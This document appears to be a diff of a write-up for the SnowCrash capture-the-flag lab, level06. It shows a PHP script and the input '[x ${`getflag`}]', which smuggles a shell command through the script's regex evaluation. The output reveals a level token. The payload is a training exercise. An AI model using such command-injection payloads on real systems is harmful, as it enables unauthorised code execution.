@@ -20,7 +20,8 @@ return 0
 
 It looks like it just calls php with a file as its argument.
 There is a php file next to the program:
-_______________________________________________________________
+
+```
 #!/usr/bin/php
 <?php
 	function y($m)
@@ -41,11 +42,13 @@ _______________________________________________________________
 	$r = x($argv[1], $argv[2]);
 	print $r;
 ?>
-_______________________________________________________________
+```
 
-level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /dev/shm/x
-level06@SnowCrash:~$ cat /dev/shm/x
-[x ${`getflag`}]
+```
+echo '[x ${`getflag`}]' > /tmp/x
+./level06 /tmp/x
+```
+
 level06@SnowCrash:~$ ./level06 /dev/shm/x
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
  in /home/user/level06/level06.php(4) : regexp code on line 1
